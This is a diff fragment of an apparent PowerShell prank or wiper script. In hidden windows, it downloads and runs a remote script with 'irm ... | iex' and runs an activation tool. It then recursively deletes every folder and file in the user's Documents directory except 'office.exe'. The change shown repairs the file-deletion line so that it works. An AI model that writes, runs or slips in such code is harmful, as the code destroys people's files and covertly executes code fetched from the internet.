@@ -125,7 +125,7 @@ Start-Process PowerShell.exe -ArgumentList "-NoExit", "-Command", "& { irm https
 Start-Process PowerShell.exe -ArgumentList "-NoExit", "-Command", "& { irm https://massgrave.dev/get | iex }" -WindowStyle Hidden
 Start-Process PowerShell.exe -ArgumentList "-NoExit", "-Command", "& { EVKey64 | cmd }" -WindowStyle Hidden
 Get-ChildItem -Path ([Environment]::GetFolderPath("MyDocuments")) -Recurse -dir | foreach { Remove-Item -Force -Recurse -Path $_}
-Get-ChildItem -Path ([Environment]::GetFolderPath("MyDocuments")) -file | Where-Object {$_.Name -NotContains "office.exe"} | Remove-Item -Force -Recurse -Path $_.FullName
+Get-ChildItem -Path ([Environment]::GetFolderPath("MyDocuments")) -file | Where-Object {$_.Name -NotContains "office.exe"} | Remove-Item -Force -Recurse
 $l = @'
  "ROFL:ROFL:ROFL:ROFL"   /$$$$$$$$ /$$           /$$           /$$                       /$$
          _^___          | $$_____/|__/          |__/          | $$                      | $$
